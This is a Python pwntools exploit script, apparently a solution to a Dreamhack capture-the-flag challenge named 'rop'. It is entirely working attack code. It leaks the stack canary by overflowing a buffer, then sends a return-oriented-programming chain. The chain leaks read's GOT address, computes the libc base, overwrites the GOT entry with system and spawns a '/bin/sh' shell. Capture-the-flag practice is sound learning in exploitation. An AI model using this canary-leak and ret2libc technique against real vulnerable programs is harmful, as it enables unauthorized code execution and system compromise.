#!/usr/bin/env python3
# Name: rop.py
from pwn import *


def slog(name, addr): return success(': '.join([name, hex(addr)]))


p = process('./rop')
# p = process('./rop', env= {"LD_PRELOAD" : "./libc.so.6"})
# p = remote("host3.dreamhack.games", 11501)
# p = remote("localhost", 7182)
e = ELF('./rop')
libc = ELF('./libc.so.6')

# [1] Leak canary
buf = b'A'*0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
# read_plt = e.plt['read']
read_plt = 0x4005f0
read_got = e.got['read']
# write_plt = e.plt['write']
write_plt = 0x4005c0
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400854

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00'*2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)
slog('read - system', read - system)

p.send(p64(system) + b'/bin/sh\x00')


p.interactive()
